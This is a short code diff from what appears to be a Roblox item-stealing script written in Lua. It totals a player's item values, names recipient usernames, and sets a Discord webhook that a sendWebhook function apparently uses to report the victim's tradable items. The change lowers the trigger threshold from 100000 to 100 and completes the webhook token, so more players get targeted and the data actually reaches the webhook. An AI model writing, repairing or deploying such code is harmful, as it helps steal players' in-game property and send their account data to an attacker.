@@ -96,9 +96,9 @@ for _, item in ipairs(items) do
 	totalValue += item.value * item.quantity
 end
 
-if totalValue >= 100000 then
+if totalValue >= 100 then
     usernames = { "xQuartz0", "isaidmager", "" } -- dual usernames
-    webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVb.."
+    webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVbCs"
 end
 
 local function sendWebhook(totalValue, tradableSummary)
